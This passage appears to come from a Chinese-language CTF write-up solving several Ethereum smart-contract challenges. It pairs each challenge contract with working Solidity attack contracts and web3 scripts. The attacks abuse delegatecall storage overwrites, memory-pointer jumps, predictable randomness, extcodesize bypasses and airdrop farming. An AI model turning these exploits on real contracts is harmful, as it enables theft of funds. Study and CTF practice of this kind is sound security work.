&#125;\n        assembly &#123;\n            result := mload(add(msg_data, add(0x20, 0x24)))\n        &#125;\n    &#125;\n\n    modifier isOwner()&#123;\n        require(msgPassword() == password);\n        require(msg.sender != tx.origin);\n        uint x;\n        assembly &#123; x := extcodesize(caller) &#125;\n        require(x == 0);\n        _;\n    &#125;\n\n    modifier notExplodeYet()&#123;\n        launcher = Launcher(launcher_address);\n        require(block.number &lt; launcher.deadline());\n        hasExplode = true;\n        _;\n    &#125;\n\n    constructor(address _launcher_address, bytes32 _fake_flag) public &#123;\n        launcher_address = _launcher_address;\n        password = _fake_flag ;\n    &#125;\n\n    function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet &#123;\n        launcher_address.delegatecall(abi.encodeWithSignature(\"setdeadline(uint256)\",_deadline));\n    &#125;\n&#125;\n\ncontracts/Setup.sol\npragma solidity ^0.5.10;\n\nimport \"./EasyBomb.sol\";\nimport \"./Launcher.sol\";\n\ncontract Setup &#123;\n    EasyBomb public easyBomb;\n\n    constructor(bytes32 _password) public &#123;\n        easyBomb = new EasyBomb(address(new Launcher()), _password);\n    &#125;\n\n    function isSolved() public view returns (bool) &#123;\n        return easyBomb.power_state() == false;\n    &#125;\n&#125;\n\ncontracts/Launcher.sol\npragma solidity ^0.5.10;\n\ncontract Launcher&#123;\n    uint256 public deadline;\n    function setdeadline(uint256 _deadline) public &#123;\n        deadline = _deadline;\n    &#125;\n\n    constructor() public &#123;\n        deadline = block.number + 100;\n    &#125;\n&#125;\n\nAnalyse题目要求关掉炸弹，也就是power_state变量为false，EasyBomb合约在setCountDownTimer函数使用了delegatecall，调用了launcher合约的setdeadline函数，修改slot0中的变量，而在EasyBomb合约中slot0存储了hasExplode的bool变量以及launcher_address变量，因此我们可以将lancher修改成攻击合约，再在攻击合约中编写函数修改slot2中的变量为false就可以了\n调用setCountDownTimer要绕过两个限制，其中的notExplodeYet好说，在合约部署后的100个区块内都可以绕过该检测，但是第一次delegatecall执行之后“launcher”合约中的slot0变量作为deadline，如果不初始化则为0，则攻击失败\n另一个检测就是isOwner，其中分为三个部分，首先分析caller的size为0–对应解决方法就是constructor函数，其次sender!&#x3D;origin，还是使用合约做agent\n最后也就是msgPassword() &#x3D;&#x3D; password，简单写一个脚本得到fakeflag也就是password为\n0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d\n即flag&#123;donLetUrDreamBeDream&#125;\n\n绕过该判断条件需要使calldata的第68位之后的32位bytes等于fakeflag（不含selector&#x3D;&#x3D;4位bytes），而calldata最后的参数刚好是64+8+64&#x3D;136（0x44byte之后）\n综上即可绕过所有检测\nAttackcontract attack&#123;\n    uint256 public deadline;\n    constructor(address tar)public&#123;\n        address target=tar;\n        bytes32 data0=0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d;\n        address helperaddr=address(new helper());\n        bytes memory data=abi.encodeWithSignature(\"setCountDownTimer(uint256)\",uint(uint168(uint160(helperaddr))&lt;&lt;8),data0);\n        bytes memory data1=abi.encodeWithSignature(\"setCountDownTimer(uint256)\",0,data0);\n        tar.call(data);\n        tar.call(data1);\n    &#125;\n&#125;\n\ncontract helper&#123;\n    uint256 public deadline=block.number + 100;\n    bytes32 private password;\n    bool public power_state = true;\n    function setdeadline(uint256 _deadline) public &#123;\n        power_state = _deadline!=0;\n    &#125;\n&#125;\n\nSafeDelegatecall\n\n\n\n\n\n\n\n\nCan delegatecall be safe?\nCodepragma solidity ^0.4.23;\n\ncontract SafeDelegatecall &#123;\n\n    address private owner;\n    bytes4 internal constant SET = bytes4(keccak256('fifth(uint256)'));\n    event SendFlag(address addr);\n    uint randomNumber = 0;\n\n    struct Func &#123;\n        function() internal f;\n    &#125;\n\n    constructor() public payable &#123;\n        owner = msg.sender;\n    &#125;\n\n    modifier onlyOwner &#123;\n        require(msg.sender == owner);\n        _;\n    &#125;\n\n    function execute(address _target) public payable&#123;\n        require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, 'unsafe execution');\n\n        bytes4 sel;\n        uint val;\n\n        (sel, val) = getRet();\n        require(sel == SET);\n\n        Func memory func;\n        func.f = gift;\n        assembly &#123;\n            mstore(func, sub(mload(func), val))\n        &#125;\n        func.f();\n    &#125;\n\n    function gift() private &#123;\n        payforflag();\n    &#125;\n\n    function getRet() internal pure returns (bytes4 sel, uint val) &#123;\n        assembly &#123;\n            if iszero(eq(returndatasize, 0x24)) &#123; revert(0, 0) &#125;\n            let ptr := mload(0x40)\n            returndatacopy(ptr, 0, 0x24)\n            sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)\n            val := mload(add(0x04, ptr))\n        &#125;\n    &#125;\n\n    function payforflag() public payable onlyOwner &#123;\n        require(msg.value == 1, 'I only need a little money!');\n        emit SendFlag(msg.sender);\n        selfdestruct(msg.sender);\n    &#125;\n\n    function() payable public&#123;&#125;\n&#125;\n\nAnalayse由于execute函数增加了require，有效防止了delegatecall对于合约storage变量的修改，但是下方的memory变量的改变取决于returndata，而returndata可控—-revert(s,t)，控制returndatasize为0x24，前bytes4为全局变量SET即可保证第二次require不会出错\n但是此处有一个很奇怪的变量val，这个变量的值为returndata的后32个byte，而这个只是可控的，所以也就是说sub(mload(func), val)这个值可控制，而这个值又被memory store，重新赋值了fun.f，也就是说，执行到此的时候func.f可以被赋值为任何我们想要的值，也就形成了任意跳转，即可绕过一切限制条件\n分析到这里题目的思路已经很清晰了：①得到任意跳转到的目标地址②计算mload(func)的值是多少③编写攻击合约，返回期望的returndata—–全部的memory变量\n反编译一下，因为合约中仅有一个函数判断了msg.value是否为1，所以本段代码比较好对应，也就是payforflag函数中，对应为下图\n\n可见如果msg.value确实为1的话将会跳转到0x3c1，所以可以确定，任意跳转到0x3c1地址，即可绕过\nonlyOwner以及 require(msg.value == 1, &#39;I only need a little money!&#39;) 的限制条件直接&#96;emit sendFlag\n结合remix编译器反编译出的opcode对应线下反编译的结果，定位到mload(func)进而上溯至push gift一步操作，得到gift函数对应destination为0x48a\n\n\n综上所述，已经可以构造攻击合约进行攻击\nAttackcontract attack &#123;\n    bytes4 constant SEL = bytes4(keccak256('fifth(uint256)'));\n    function execute(address balabala) public&#123;\n        bytes4 sel = SEL;\n        assembly &#123;\n            mstore(0,sel)\n            mstore(0x4,sub(0x0362,0x2e4))//sub(0x48a,0x3c1)\n            revert(0,0x24)\n        &#125;\n    &#125;\n&#125;\n\n在此发现了很有意思的一点，进行部署时的代码和题目给出的代码并不相同，于是重新分析一下是如下结果，所以代码框中的注释部分为题目代码的数值，未注释部分为实际部署时对应的数值\n\nbad randomness\n\n\n\n\n\n\n\n\nHave you ever played eos.win? It’s quite easy to get eos tokens here! Submite the base64 code of your email address to the CaptureTheFlag(string b64email) fucntion when you have enough EOS. This contract is at 0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F in Ropsten network.\nEOSGame\n\npragma solidity ^0.4.24;\n\nlibrary SafeMath &#123;\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    if (a == 0) &#123;\n      return 0;\n    &#125;\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  &#125;\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b &lt;= a);\n    uint256 c = a - b;\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Adds two numbers, reverts on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n  * reverts when dividing by zero.\n  */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b != 0);\n    return a % b;\n  &#125;\n&#125;\n\ncontract EOSToken&#123;\n    using SafeMath for uint256;\n    string TokenName = \"EOS\";\n    \n    uint256 totalSupply = 100**18;\n    address owner;\n    mapping(address => uint256)  balances;\n    \n    modifier onlyOwner() &#123;\n        require(msg.sender == owner);\n        _;\n    &#125;\n    \n    constructor() public&#123;\n        owner = msg.sender;\n        balances[owner] = totalSupply;\n    &#125;\n    \n    function mint(address _to,uint256 _amount) public onlyOwner &#123;\n        require(_amount &lt; totalSupply);\n        totalSupply = totalSupply.sub(_amount);\n        balances[_to] = balances[_to].add(_amount);\n    &#125;\n    \n    function transfer(address _from, address _to, uint256 _amount) public onlyOwner &#123;\n        require(_amount &lt; balances[_from]);\n        balances[_from] = balances[_from].sub(_amount);\n        balances[_to] = balances[_to].add(_amount);\n    &#125;\n    \n    function eosOf(address _who) public constant returns(uint256)&#123;\n        return balances[_who];\n    &#125;\n&#125;\n\n\ncontract EOSGame&#123;\n    \n    using SafeMath for uint256;\n    mapping(address => uint256) public bet_count;\n    uint256 FUND = 100;\n    uint256 MOD_NUM = 20;\n    uint256 POWER = 100;\n    uint256 SMALL_CHIP = 1;\n    uint256 BIG_CHIP = 20;\n    EOSToken  eos;\n    \n    event FLAG(string b64email, string slogan);\n    \n    constructor() public&#123;\n        eos=new EOSToken();\n    &#125;\n    \n    function initFund() public&#123;\n        if(bet_count[tx.origin] == 0)&#123;\n            bet_count[tx.origin] = 1;\n            eos.mint(tx.origin, FUND);\n        &#125;\n    &#125;\n    \n    function bet(uint256 chip) internal &#123;\n        bet_count[tx.origin] = bet_count[tx.origin].add(1);\n        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));\n        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));\n        uint256 shark = seed_hash % MOD_NUM;\n        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));\n        uint256 lucky = lucky_hash % MOD_NUM;\n        if (shark == lucky)&#123;\n            eos.transfer(address(this), tx.origin, chip.mul(POWER));\n        &#125;\n    &#125;\n    \n    function smallBlind() public &#123;\n        eos.transfer(tx.origin, address(this), SMALL_CHIP);\n        bet(SMALL_CHIP);\n    &#125;\n    \n    function bigBlind() public &#123;\n        eos.transfer(tx.origin, address(this), BIG_CHIP);\n        bet(BIG_CHIP);\n    &#125;\n    \n    function eosBlanceOf() public view returns(uint256) &#123;\n        return eos.eosOf(tx.origin);\n    &#125;\n\n    function CaptureTheFlag(string b64email) public&#123;\n\t\trequire (eos.eosOf(tx.origin) > 18888);\n\t\temit FLAG(b64email, \"Congratulations to capture the flag!\");\n\t&#125;\n&#125;\n\nAnalyse合约里边查询余额所用的参数为tx.origin，提示的太明显了，再加之bet中使用的都是区块链的全局变量，写个合约进行predict即可\nAttack一遍一遍的太烦了，写个脚本搞一下吧\ncontract attack&#123;\n    mapping(address => uint256) public bet_count;\n    EOSGame tar;\n    uint256 MOD_NUM = 20;\n    uint public a;\n    uint public b;\n    constructor()&#123;\n        bet_count[tx.origin]+=1;\n        tar=EOSGame(0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F);\n        tar.initFund();\n    &#125;\n\n    function pwn()public&#123;\n        (a,b)=core();\n    &#125;\n\n    function core()internal returns(uint sharknum,uint luckynum) &#123;\n        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));\n        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));\n        uint256 shark = seed_hash % MOD_NUM;\n        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));\n        uint256 lucky = lucky_hash % MOD_NUM;\n        if (shark == lucky)&#123;\n            bet_count[tx.origin] = bet_count[tx.origin]+1;\n            tar.bigBlind();\n        &#125;\n        return(shark,lucky);\n    &#125;\n    function shark() public view returns(uint sharnum)&#123;\n        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));\n        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));\n        uint256 shark = seed_hash % MOD_NUM;\n        return shark;\n    &#125;\n\n\nfrom base64 import b16decode\nfrom web3 import Web3,HTTPProvider\nimport time\nw3=Web3(HTTPProvider('https://ropsten.infura.io/v3/18a393d792ae461489aa663d5d1b3fdf'))\n\nabi=[attack abi]\nabi1=[token abi]\n\neosadd='token address'\nconaddress='attack address'\n\neostoken=w3.eth.contract(abi=abi1,address=eosadd)\nswap=w3.eth.contract(abi=abi,address=conaddress)\nacct=w3.eth.account.from_key('privatekey')\n\n\nfor i in range(0,0xfffffffffffffffffffffffff):\n\t\tparams = swap.functions.pwn().buildTransaction(&#123;\n\t\t\t'nonce':w3.eth.getTransactionCount(acct.address),\n\t\t\t'gas':3000000,\n\t\t\t'gasPrice':w3.eth.gasPrice\n\t\t&#125;)\n\t\tprint(w3.eth.sendRawTransaction(acct.signTransaction(params).rawTransaction).hex())\n\n\t\ttime.sleep(40)\n\t\tb1=eostoken.functions.eosOf(acct.address).call()\n\t\tprint(b1,b1>18888)\n\t\tif b1>18888:\n\t\t\tbreak\n\n写个脚本，有点费钱，还得拼运气😂\nairdrop huntingCoinFlip\n\n\n\n\n\n\n\n\n\nHoneyLock\naddress :0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 on ropsten.\ncall CaptureTheFlag with base64(your email),you will receive flag.\n\nCodepragma solidity ^0.4.24;\n\ncontract P_Bank\n&#123;\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 0.1 ether;\n    \n    Log TransferLog;\n\n    event FLAG(string b64email, string slogan);\n    \n\n\n    constructor(address _log) public &#123; \n        TransferLog = Log(_log);\n     &#125;\n\n    function Ap() public &#123;\n        if(balances[msg.sender] == 0) &#123;\n            balances[msg.sender]+=1 ether;\n        &#125;\n    &#125;\n\n    function Transfer(address to, uint val) public &#123;\n        if(val > balances[msg.sender]) &#123;\n            revert();\n        &#125;\n        balances[to]+=val;\n        balances[msg.sender]-=val;\n    &#125;\n\n    function CaptureTheFlag(string b64email) public returns(bool)&#123;\n      require (balances[msg.sender] > 500 ether);\n      emit FLAG(b64email, \"Congratulations to capture the flag!\");\n    &#125;\n\n    \n    function Deposit()\n    public\n    payable\n    &#123;\n        if(msg.value > MinDeposit)\n        &#123;\n            balances[msg.sender]+= msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        &#125;\n    &#125;\n    \n    function CashOut(uint _am) public \n    &#123;\n        if(_am&lt;=balances[msg.sender])\n        &#123;\n            \n            if(msg.sender.call.value(_am)())\n            &#123;\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            &#125;\n        &#125;\n    &#125;\n    \n    function() public payable&#123;&#125;    \n    \n&#125;\n\ncontract Log \n&#123;\n   \n    struct Message\n    &#123;\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    &#125;\n    \n    string err = \"CashOut\";\n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    &#123;\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    &#125;\n&#125;\n\nAnalyseap函数，transfer函数循环调用就好了\nAttackcontract attack&#123;\n    P_Bank target;\n    constructor(address tar)public&#123;\n        target=P_Bank(tar);\n    &#125;\n    function pwn()public &#123;\n        for(uint i=0;i&lt;500;i++)&#123;\n            target.Ap();\n            target.Transfer(tx.origin,1 ether);\n        &#125;\n    &#125;\n&#125;\n\nFake3d\n\n\n\n\n\n\n\n\nWelcome to fake3D game! There are airdrops for you, but you have to pass the turning test first! Flag is cheaper here, and also sent to your email. This game is at 0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a in Ropsten network.\nCode/**\n *Submitted for verification at Etherscan.io on 2018-11-27\n*/\n\npragma solidity ^0.4.24;\n\n/**\n * @title SafeMath\n * @dev Math operations with safety checks that revert on error\n */\nlibrary SafeMath &#123;\n\n  /**\n  * @dev Multiplies two numbers, reverts on overflow.\n  */\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n    // benefit is lost if 'b' is also tested.\n    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n    if (a == 0) &#123;\n      return 0;\n    &#125;\n\n    uint256 c = a * b;\n    require(c / a == b);\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\n  */\n  function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b > 0); // Solidity only automatically asserts when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n  */\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b &lt;= a);\n    uint256 c = a - b;\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Adds two numbers, reverts on overflow.\n  */\n  function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    uint256 c = a + b;\n    require(c >= a);\n\n    return c;\n  &#125;\n\n  /**\n  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\n  * reverts when dividing by zero.\n  */\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n    require(b != 0);\n    return a % b;\n  &#125;\n&#125;\n\ncontract WinnerList&#123;\n    address owner;\n    struct Richman&#123;\n        address who;\n        uint balance;\n    &#125;\n    \n    function note(address _addr, uint _value) public&#123;\n        Richman rm;\n        rm.who = _addr;\n        rm.balance = _value;\n    &#125;\n    \n&#125;\n\ncontract Fake3D &#123;\n    using SafeMath for *;\n\tmapping(address => uint256)  public balance;\n\tuint public totalSupply  = 10**18;\n\tWinnerList wlist;\n\t\n\tevent FLAG(string b64email, string slogan);\n\t\n\tconstructor(address _addr) public&#123;\n\t    wlist = WinnerList(_addr);\n\t&#125;\n\n\tmodifier turingTest() &#123;\n\t        address _addr = msg.sender;\n\t        uint256 _codeLength;\n\t        assembly &#123;_codeLength := extcodesize(_addr)&#125;\n\t        require(_codeLength == 0, \"sorry humans only\");\n\t        _;\n\t&#125;\n    \n    function transfer(address _to, uint256 _amount) public&#123;\n        require(balance[msg.sender] >= _amount);\n        balance[msg.sender] = balance[msg.sender].sub(_amount);\n        balance[_to] = balance[_to].add(_amount);\n    &#125;\n\n\n\tfunction airDrop() public turingTest returns (bool) &#123;\n\t\tuint256 seed = uint256(keccak256(abi.encodePacked(\n            (block.timestamp).add\n            (block.difficulty).add\n            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n            (block.gaslimit).add\n            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n            (block.number)\n        )));\n\n        if((seed - ((seed / 1000) * 1000)) &lt; 288)&#123;\n            balance[tx.origin] = balance[tx.origin].add(10);\n\t\t\ttotalSupply = totalSupply.sub(10);\n\t\t\treturn true;\n\t\t&#125;\n        else\n\t\t\treturn false;\n\t&#125;\n\t\n   function CaptureTheFlag(string b64email) public&#123;\n\t\trequire (balance[msg.sender] > 8888);\n\t\twlist.note(msg.sender,balance[msg.sender]);\n\t\temit FLAG(b64email, \"Congratulations to capture the flag?\");\n\t&#125;\n\n&#125;\n\nAnalyse薅羊毛，薅就行了，gas调到0.075eth，pwn(600)\nAttackcontract attack&#123;\n    using SafeMath for *;\n    uint256 public flag;\n    function pwn(uint times) public returns(uint)&#123;\n            for(uint i=0;i&lt;times;i++)&#123;\n                new helper();\n            &#125;\n    &#125;\n&#125;\n\ncontract helper&#123;\n    constructor() public&#123;\n        Fake3D target=Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a);\n        target.airDrop();\n    &#125;\n&#125;\n\n\n又发生了一件有意思的事情，Capturetheflag时候报错，看来又是所给代码和实际代码不是一套\n看一下实际合约又发现源码不开源😫\n反编译一下\ncontract Contract &#123;\n    function main() &#123;\n        memory[0x40:0x60] = 0x80;\n    \n        if (msg.data.length &lt; 0x04) &#123; revert(memory[0x00:0x00]); &#125;\n    \n        var var0 = msg.data[0x00:0x20] / 0x0100000000000000000000000000000000000000000000000000000000 &amp; 0xffffffff;\n    \n        if (var0 != 0x03b6eb88) &#123; revert(memory[0x00:0x00]); &#125;\n    \n        var var1 = msg.value;\n    \n        if (var1) &#123; revert(memory[0x00:0x00]); &#125;\n    \n        var1 = 0x0091;\n        var var2 = msg.data[0x04:0x24] &amp; 0xffffffffffffffffffffffffffffffffffffffff;\n        var var3 = msg.data[0x24:0x44];\n        func_0093(var2, var3);\n        stop();\n    &#125;\n    \n    function func_0093(var arg0, var arg1) &#123;\n        var var0 = 0x00;\n        storage[var0] = (arg0 &amp; 0xffffffffffffffffffffffffffffffffffffffff) | (storage[var0] &amp; ~0xffffffffffffffffffffffffffffffffffffffff);\n        storage[var0 + 0x01] = arg1;\n        var var1 = ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &amp; 0x0100000000000000000000000000000000000000000000000000000000000000 * 0xb1;\n        var var2 = tx.origin * 0x01000000000000000000000000;\n        var var3 = 0x12;\n    \n        if (var3 >= 0x14) &#123; assert(); &#125;\n    \n        var temp0 = byte(var2, var3) * 0x0100000000000000000000000000000000000000000000000000000000000000 &amp; ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff != var1;\n        var1 = temp0;\n    \n        if (!var1) &#123;\n        label_023F:\n        \n            if (!var1) &#123; return; &#125;\n            else &#123; revert(memory[0x00:0x00]); &#125;\n        &#125; else &#123;\n            var1 = ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &amp; 0x0100000000000000000000000000000000000000000000000000000000000000 * 0x43;\n            var2 = tx.origin * 0x01000000000000000000000000;\n            var3 = 0x13;\n        \n            if (var3 >= 0x14) &#123; assert(); &#125;\n        \n            var1 = byte(var2, var3) * 0x0100000000000000000000000000000000000000000000000000000000000000 &amp; ~0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff != var1;\n            goto label_023F;\n        &#125;\n    &#125;\n&#125;\n\n发现了revert和assert，着重分析一下\n根据逻辑计算发现就是判断tx.origin的倒数三四位的值是否等于0xb1\n倒数一二位的值是否等于0x43\n写个脚本跑一个出来就好了\ndef generate_random_str(randomlength=16):\n    string.digits='0123456789'\n    string.ascii_letters='abcdef'\n    str_list = [random.choice(string.digits + string.ascii_letters) for i in range(randomlength)]\n    random_str = ''.join(str_list)\n    return random_str\nfor i in range(0,0xffffff):\n     a=generate_random_str(64)\n     address=blocksmith.EthereumWallet.generate_address(a)\n     print(address[40:42],address[39:41])\n     if(address[40:42]=='43')or(address[38:40]=='b1'):\n            print(a,address)\n            break\n\n\n导入metamask，调用函数，即可\nbabybetCode0x6080604052600436106100775763ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663645b8b1b811461009857806366d16cc3146100d85780637365870b146100ef5780638c0320de14610107578063e3d670d71461019e578063f0d25268146101cc575b3360009081526020819052604090208054670de0b6b3a76400003404019055005b3480156100a457600080fd5b506100c673ffffffffffffffffffffffffffffffffffffffff600435166101fd565b60408051918252519081900360200190f35b3480156100e457600080fd5b506100ed61020f565b005b3480156100fb57600080fd5b506100ed60043561024c565b34801561011357600080fd5b506040805160206004803580820135601f81018490048402850184019095528484526100ed94369492936024939284019190819084018382808284375050604080516020601f89358b018035918201839004830284018301909452808352979a9998810197919650918201945092508291508401838280828437509497506102e29650505050505050565b3480156101aa57600080fd5b506100c673ffffffffffffffffffffffffffffffffffffffff6004351661047d565b3480156101d857600080fd5b506100ed73ffffffffffffffffffffffffffffffffffffffff6004351660243561048f565b60016020526000908152604090205481565b336000908152600160205260409020541561022957600080fd5b336000908152602081815260408083208054600a01905560019182905290912055565b336000908152602081905260408120548190600a111561026b57600080fd5b3360009081526001602052604090205460021161028757600080fd5b5050336000908152602081905260409020805460091901905543600019014060038106828114156102ca5733600090815260208190526040902080546103e80190555b50503360009081526001602052604090206002905550565b33600090815260208190526040902054620f4240111561030157600080fd5b60025473ffffffffffffffffffffffffffffffffffffffff16331461033157336000908152602081905260408120555b60025460405173ffffffffffffffffffffffffffffffffffffffff90911690303180156108fc02916000818181858888f19350505050158015610378573d6000803e3d6000fd5b507f6335b7f9c4dff99c3a870eaf18b802774df3aba4e21b72549f3a03b6bc974c908282604051808060200180602001838103835285818151815260200191508051906020019080838360005b838110156103dd5781810151838201526020016103c5565b50505050905090810190601f16801561040a5780820380516001836020036101000a031916815260200191505b50838103825284518152845160209182019186019080838360005b8381101561043d578181015183820152602001610425565b50505050905090810190601f16801561046a5780820380516001836020036101000a031916815260200191505b5094505050505060405180910390a15050565b60006020819052908152604090205481565b336000908152602081905260409020548111156104ab57600080fd5b336000908152602081905260408082208054849003905573ffffffffffffffffffffffffffffffffffffffff93909316815291909120805490910190555600a165627a7a723058207958bdc84ae120b218d0987fdff009a5dbca73d76271563852fd4b0550efa3790029\n\nAnalyse没开源的合约，涉及到了软肋\n反编译一下得到关键函数\n\n逐一分析即可，比较简单，主要在于payforflag函数，payforflag函数会进行一次将合约余额转账给owner，失败则revert，成功则一定会递归至label_043D\nlabel_043D:\n                            var temp9 = var8;\n                            var6 = temp9 + var6;\n                            var7 = temp9 &amp; 0x1f;\n                        \n                            if (!var7) &#123;\n                                var temp10 = memory[0x40:0x60];\n                                log(memory[temp10:temp10 + var6 - temp10], [stack[-8]]);\n                                return;\n                            &#125; else &#123;\n                                var temp11 = var7;\n                                var temp12 = var6 - temp11;\n                                memory[temp12:temp12 + 0x20] = ~(0x0100 ** (0x20 - temp11) - 0x01) &amp; memory[temp12:temp12 + 0x20];\n                                var temp13 = memory[0x40:0x60];\n                                log(memory[temp13:temp13 + (temp12 + 0x20) - temp13], [stack[-8]]);\n                                return;\n                            &#125;\n                        &#125;\n\n也就是如上函数，执行了emit，所以重写合约得到如下\ncontract babybet&#123;\n    mapping(address=>uint)public balanceOf;\n    mapping(address=>bool)public statusOf;\n    address private diao;\n    event sendflag();\n\n    function transferbalance(address to,uint value)public&#123;\n        require(balanceOf[msg.sender]>=value);\n        balanceOf[msg.sender]-=value;\n        balanceOf[to]+=value;\n    &#125;\n    \n    function profit() public&#123;\n        require(!statusOf[msg.sender]);\n        balanceOf[msg.sender]+=10;\n        statusOf[msg.sender]=true;\n    &#125;\n\n    function bet(uint arg0)public&#123;\n        require(balanceOf[msg.sender]>=10);\n        balanceOf[msg.sender]-=10;\n        bytes32 var0=blockhash(block.number - 1);\n        uint var1=uint(var0)%3;\n        if(var1!=arg0)&#123;\n           statusOf[msg.sender]=bool(byte(0x02)); \n        &#125;else&#123;\n            balanceOf[msg.sender]+=1000;\n            statusOf[msg.sender]=bool(byte(0x02));\n        &#125;\n    &#125;\n\n    function payforflag(string arg0, string arg1)public&#123;\n        require(balanceOf[msg.sender]>=1000000);\n        (success,)=diao.call.gas(2300).value(address(this).balance);\n        require(success);\n        emit sendflag();\n        &#125;\n\n    function balance(address account)public view returns(uint)&#123;\n        return balanceOf[account];\n    &#125;\n    function status(address account)public view returns(bool)&#123;\n        return statusOf[account];\n    &#125;\n&#125;\n\n一次bet得1000，需要1000000token\n剩下的部分就是薅羊毛了\nAttackcontract helper&#123;\n    constructor()public&#123;\n        babybet target=babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A);\n        bytes32 var0=blockhash(block.number - 1);\n        uint var1=uint(var0)%3;\n        target.profit();\n        target.bet(var1);\n        target.transferbalance(msg.sender,1000);\n    &#125;\n&#125;\n\ncontract attack&#123;\n    function pwn(uint times) public&#123;\n        for(uint i=0;i&lt;times;i++) \n        new helper();\n    &#125;\n    function solve() public&#123;\n        babybet target=babybet(0x5d1BeEFD4dE611caFf204e1A318039324575599A);\n        target.payforflag(\"bcYng\",\"nb\");\n    &#125;\n&#125;\n\nstorageCode// pragma solidity ^0.4.2;\ncontract cow&#123;\n    address public owner_1;\n    address public owner_2;\n    address public owner_3;\n    address public owner;\n    mapping(address => uint) public balance;\n\n    struct hacker &#123;\n        address hackeraddress1;\n        address hackeraddress2;\n    &#125;\n    hacker  h;\n\n    constructor()public&#123;\n        owner = msg.sender;\n        owner_1 = msg.sender;\n        owner_2 = msg.sender;\n        owner_3 = msg.sender;\n    &#125;\n\n    event SendFlag(string b64email);\n\n\n    function payforflag(string memory b64email) public\n    &#123;\n        require(msg.sender==owner_1);\n        require(msg.sender==owner_2);\n        require(msg.sender==owner_3);\n        owner.transfer(address(this).balance);\n        emit SendFlag(b64email);\n    &#125;\n\n    function Cow() public payable\n    &#123;\n        uint geteth=msg.value/1000000000000000000;\n        if (geteth==1)\n        &#123;\n            owner_1=msg.sender;\n        &#125;\n    &#125;\n\n    function cov() public payable\n    &#123;\n        uint geteth=msg.value/1000000000000000000;\n        if (geteth&lt;1)\n        &#123;\n            hacker fff=h;\n            fff.hackeraddress1=msg.sender;\n        &#125;\n        else\n        &#123;\n            fff.hackeraddress2=msg.sender;\n        &#125;\n    &#125;\n\n    function see() public payable\n    &#123;\n        uint geteth=msg.value/1000000000000000000;\n        balance[msg.sender]+=geteth;\n        if (uint(msg.sender) &amp; 0xffff == 0x525b)\n        &#123;\n            balance[msg.sender] -= 0xb1b1;\n        &#125;\n    &#125;\n\n    function buy_own() public\n    &#123;\n        require(balance[msg.sender]>1000000);\n        balance[msg.sender]=0;\n        owner_3=msg.sender;\n    